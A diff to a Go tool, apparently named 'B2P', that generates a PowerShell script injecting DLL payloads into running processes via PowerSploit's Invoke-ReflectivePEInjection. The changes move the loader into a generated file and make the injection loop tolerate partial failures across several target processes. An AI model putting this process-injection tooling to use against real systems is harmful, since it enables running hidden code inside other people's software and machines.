@@ -3,18 +3,15 @@ package main
 import (
 	"bytes"
 	"debug/pe"
-	_ "embed"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"strings"
 )
 
-//go:embed Invoke-ReflectivePEInjection.ps1
-var reflectiveLoader string
-
-//go:embed PowerSploit-LICENSE
-var reflectiveLoaderLicense string
+// The reflective loader (PowerSploit, BSD 3-Clause) and its license notice are
+// compiled in from psloader.go, which tools/psloader generates. No external
+// asset is needed to build this package.
 
 func hasPESignature(payload []byte) bool {
 	if len(payload) < 64 || !bytes.HasPrefix(payload, []byte("MZ")) {
@@ -154,14 +151,25 @@ if ($targets.Count -eq 0) {
     [Console]::Error.WriteLine('B2P: no matching target process')
     exit 5
 }
-$result = 0
+$loaded = 0
+$failed = 0
+$failCode = 0
 foreach ($process in $targets) {
     try {
         Invoke-ReflectivePEInjection -PEBytes $sc -ProcId $process.Id -DoNotZeroMZ -ErrorAction Stop
+        $loaded++
     } catch {
         [Console]::Error.WriteLine('B2P: DLL load failed for PID ' + $process.Id + ': ' + $_.Exception.Message)
-        $result = 4
+        if ($failCode -eq 0) { $failCode = 4 }
+        $failed++
     }
 }
-exit $result
+if ($loaded -eq 0) {
+    if ($failCode -eq 0) { $failCode = 4 }
+    exit $failCode
+}
+if ($failed -gt 0) {
+    [Console]::Error.WriteLine('B2P: warning: ' + $failed + ' of ' + $targets.Count + ' matching processes could not be loaded (see above), continuing after ' + $loaded + ' successful load(s)')
+}
+exit 0
 `
